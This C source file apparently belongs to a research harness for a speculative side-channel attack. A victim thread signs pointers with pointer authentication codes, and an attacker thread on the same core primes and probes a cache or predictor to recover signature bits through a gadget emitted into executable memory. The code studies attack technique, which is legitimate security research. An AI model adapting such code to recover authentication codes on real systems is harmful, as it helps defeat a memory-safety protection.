#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <pthread.h>
#include <sys/mman.h>
#include "channel.h"

// Two threads of one process on one core: victim thread transmits on demand, attacker thread primes/probes.
struct xthread_ctl {
    volatile int      turn;        // 1 run once, 2 done
    volatile int      done;
    volatile int      round;       // attacker-set round index
    volatile int      ready;       // victim drew this round's signature
    volatile int      mode;        // -1 secret, 0 or 1 known profile value
    volatile int      bit;         // field bit being probed
    volatile int      reveal_req;
    volatile int      reveal_ack;
    volatile uint64_t truth;
    struct slot      *slot;
    uint64_t          base;
    gadget_fn         gadget;
    enum pac_switch   sw;
    int               control;
    int               core;
};

static void *victim_thread(void *arg) {
    struct xthread_ctl *ctl = arg;
    pin_to_core(ctl->core);
    enable_store_bypass();
    uint64_t signature = 0;
    int last_round = -1;
    while (!ctl->done) {
        int round = ctl->round;
        if (round != last_round && 0 <= round) {
            signature = pac_sign(ctl->base, rand_u64());
            last_round = round;
            ctl->ready = round;
        }
        if (ctl->reveal_req != ctl->reveal_ack) {
            ctl->truth = (signature >> 48) & 0x7f;
            ctl->reveal_ack = ctl->reveal_req;
        }
        if (1 == ctl->turn) {
            if (0 > ctl->mode) {
                slot_secret(ctl->slot, ctl->sw, signature, ctl->base, ctl->bit);
            } else {
                slot_profile(ctl->slot, ctl->sw, ctl->base, ctl->bit, ctl->mode);
            }
            victim_transmit(ctl->gadget, ctl->slot, ctl->control);
            ctl->turn = 2;
        } else {
            sched_yield();
        }
    }
    return NULL;
}

static void xt_next_round(void *ctx) {
    struct xthread_ctl *ctl = ctx;
    int round = ctl->round + 1;
    ctl->round = round;
    while (ctl->ready != round) {
        sched_yield();
    }
}
static void xt_set_bit(void *ctx, int bit) {
    ((struct xthread_ctl *)ctx)->bit = bit;
}
static void xt_set_mode(void *ctx, int mode) {
    ((struct xthread_ctl *)ctx)->mode = mode;
}
static void xt_transmit(void *ctx) {
    struct xthread_ctl *ctl = ctx;
    ctl->turn = 1;
    while (2 != ctl->turn) {
        sched_yield();
    }
}
static unsigned xt_reveal(void *ctx) {
    struct xthread_ctl *ctl = ctx;
    int req = ctl->reveal_req + 1;
    ctl->reveal_req = req;
    while (ctl->reveal_ack != req) {
        sched_yield();
    }
    return (unsigned)ctl->truth;
}

int run_xthread(const struct cfg *cfg, struct chan_stats *out) {
    if (M_BTB == cfg->med) {
        return run_xthread_btb(cfg, out);   // BTB uses the eviction-set attacker with a co-set victim thread
    }
    pin_to_core(cfg->cpu);
    void *base = victim_base_alloc(cfg->med);
    if (NULL == base) {
        fprintf(stderr, "victim base alloc failed\n");
        return 1;
    }
    struct attacker att = { 0 };
    attacker_setup(&att, cfg->med, cfg->tmr, (uint64_t)base);

    void *code = mmap(NULL, PAGE_BYTES, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (MAP_FAILED == code) {
        perror("mmap gadget");
        return 1;
    }
    static struct slot slot;
    struct xthread_ctl ctl = {
        .turn = 2, .round = -1, .ready = -1, .mode = -1, .slot = &slot, .base = (uint64_t)base,
        .gadget = emit_gadget(code, cfg->sw, cfg->med), .sw = cfg->sw,
        .control = cfg->control, .core = cfg->cpu,
    };
    pthread_t victim;
    if (0 != pthread_create(&victim, NULL, victim_thread, &ctl)) {
        perror("pthread_create");
        return 1;
    }

    struct victim_io io = {
        .ctx = &ctl, .next_round = xt_next_round, .set_bit = xt_set_bit,
        .set_mode = xt_set_mode, .transmit = xt_transmit, .reveal = xt_reveal,
    };
    recover_rounds(&att, &io, cfg, out);

    ctl.done = 1;
    ctl.turn = 1;
    pthread_join(victim, NULL);
    return 0;
}
